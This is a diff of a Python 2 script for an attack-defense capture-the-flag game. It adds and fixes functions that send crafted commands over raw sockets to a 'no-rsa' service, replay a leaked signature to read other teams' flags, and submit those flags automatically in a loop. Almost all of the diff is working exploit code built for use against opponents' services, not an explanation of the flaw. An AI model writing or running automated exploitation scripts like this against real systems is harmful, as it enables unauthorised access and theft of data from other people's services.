@@ -19,9 +19,9 @@ def netcat(hostname, port, content):
     s.close()
     return ret_list
 
-def exploit_no_rsa(hostname, port, flagId):
-    print 'hostname:',hostname, 'port:',port, 'flagId:', flag_id
-    content = 'S'+ "\n" + '0' + flag_id
+def exploit_configuration(hostname, port, flagId):
+    print 'hostname:',hostname, 'port:',port, 'flagId:', flagId
+    content = 'S'+ "\n" + '0' + flagId
     ret_list = netcat(hostname, port, content)
     print 'ret_list:', ret_list
     sigLine = ret_list[2]
@@ -30,7 +30,32 @@ def exploit_no_rsa(hostname, port, flagId):
     print 'lineArr:', lineArr
     sig = lineArr[1]
     print 'sig:', sig
-    content = 'R' + "\n" + flag_id + ' ' + sig
+    content = 'R' + "\n" + flagId + ' ' + sig
+    print 'content:', content
+    ret_list = netcat(hostname, port, content)
+    print ret_list
+    flag_line = ret_list[1]
+    print 'flag_line:',flag_line
+    lineArr = flag_line.split('\\n')
+    print 'lineArr:', lineArr
+    flag_line = lineArr[1]
+    print 'flag_line:', flag_line
+    flag = flag_line.split(' ')[3]
+    print 'FLAG================================================================================================:',flag
+    print(t.submit_flag([flag]))
+
+def exploit_no_rsa(hostname, port, flagId):
+    print 'hostname:',hostname, 'port:',port, 'flagId:', flagId
+    content = 'S'+ "\n" + '0' + flagId
+    ret_list = netcat(hostname, port, content)
+    print 'ret_list:', ret_list
+    sigLine = ret_list[2]
+    print 'sigline:',sigLine
+    lineArr = sigLine.split('\\n')
+    print 'lineArr:', lineArr
+    sig = lineArr[1]
+    print 'sig:', sig
+    content = 'R' + "\n" + flagId + ' ' + sig
     print 'content:', content
     ret_list = netcat(hostname, port, content)
     print ret_list
@@ -71,9 +96,13 @@ while True:
             flag_id = target['flag_id']
             if service_name == 'no-rsa':
                 try:
+                    #pass
                     exploit_no_rsa(hostname,port,flag_id)
                 except:
                     print 'Exception occured for user'
+            else:
+                pass
+                #exploit_no_rsa(hostname, port, flag_id)
             #break
     while True:
         newGameStatus = t.get_game_status()
